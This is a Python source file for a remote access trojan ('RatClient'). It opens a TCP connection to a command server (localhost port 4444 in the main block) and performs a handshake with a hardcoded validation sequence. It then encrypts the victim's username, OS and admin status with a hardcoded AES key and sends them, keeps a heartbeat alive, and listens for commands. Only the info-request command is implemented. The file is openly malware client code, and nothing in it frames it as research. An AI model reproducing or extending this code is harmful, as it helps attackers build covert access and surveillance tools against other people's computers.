# -*- coding: iso-8859-15 -*-

### -*- coding: utf-8 -*-

import socket
import random
import time
import json
import platform
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

class RatClient:
    def __init__(self):
        self.key = bytes([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 
                         16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31])
        self.validation_seq = bytes([109, 111, 111, 109, 56, 50, 53])
        self.sock = None
        self.heartbeat = None
        self.session_id = None
        
    def get_system_info(self):
        import ctypes
    
        def is_admin():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
            
        return {
            "Username": os.getlogin(),
            "OS": f"{platform.system()} {platform.release()}",
            "Version": "1.0",
            "Privileges": "Admin" if is_admin() else "User",
            "AntiVirus": "None",
            "Location": "US",
            "ID": str(self.session_id) if self.session_id else "Unknown"
    }

        
    def encrypt_data(self, data):
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        encrypted = cipher.encrypt(padded_data)
        
        # Format: [Compression (1 byte)] [Size (4 bytes)] [IV (16 bytes)] [Encrypted Data]
        header = bytes([0])  # Uncompressed
        size = len(encrypted + iv).to_bytes(4, 'little')
        
        return header + size + iv + encrypted
        
    def connect(self, host, port):
        print("[DEBUG] Main connection...")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        
        # Send type 0 for main connection
        self.sock.send(bytes([0]))
        print("[DEBUG] Connection type sent: 0")
        
        print("[DEBUG] Waiting for server key...")
        random_key = self.sock.recv(100)
        print(f"[DEBUG] Key received: {random_key.hex()}")
        
        print("[DEBUG] Sending back the key...")
        self.sock.send(random_key)
        
        print("[DEBUG] Sending validation sequence...")
        self.sock.send(self.validation_seq)
        
        print("[DEBUG] Waiting for session ID...")
        session_id = self.sock.recv(4)
        self.session_id = int.from_bytes(session_id, 'little')
        print(f"[DEBUG] Session ID: {self.session_id}")
        
        # Send initial information
        info = json.dumps(self.get_system_info()).encode()
        encrypted_info = self.encrypt_data(info)
        self.sock.send(encrypted_info)
        print("[DEBUG] Initial information sent")
        
        # Start heartbeat
        self.start_heartbeat(host, port)
        
        # Start reception thread
        self.start_receive_thread()

    def start_heartbeat(self, host, port):
        print("[DEBUG] Starting heartbeat...")
        self.heartbeat = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.heartbeat.connect((host, port))
        
        # Type 1 for heartbeat
        self.heartbeat.send(bytes([1]))
        print("[DEBUG] Heartbeat type sent: 1")
        
        def heartbeat_loop():
            while True:
                try:
                    self.heartbeat.send(bytes([1, 0, 0, 0, 2]))
                    print("[DEBUG] Heartbeat sent")
                    time.sleep(3)
                except Exception as e:
                    print(f"[ERROR] Heartbeat lost: {str(e)}")
                    break
                    
        import threading
        threading.Thread(target=heartbeat_loop, daemon=True).start()

    def start_receive_thread(self):
        def receive_loop():
            while True:
                try:
                    data = self.sock.recv(4096)
                    if not data:
                        break
                    self.handle_command(data)
                except Exception as e:
                    print(f"[ERROR] Reception: {str(e)}")
                    break
                    
        import threading
        threading.Thread(target=receive_loop, daemon=True).start()
        
    def handle_command(self, data):
        command_type = data[0] if data else 0
        print(f"[DEBUG] Command received: {command_type}")
        
        if command_type == 0:  # Info request
            info = json.dumps(self.get_system_info()).encode()
            encrypted_info = self.encrypt_data(info)
            self.sock.send(encrypted_info)
            print("[DEBUG] Client information sent")

if __name__ == "__main__":
    client = RatClient()
    try:
        client.connect("127.0.0.1", 4444)
        print("[+] Client connected")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[-] Stopping client")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
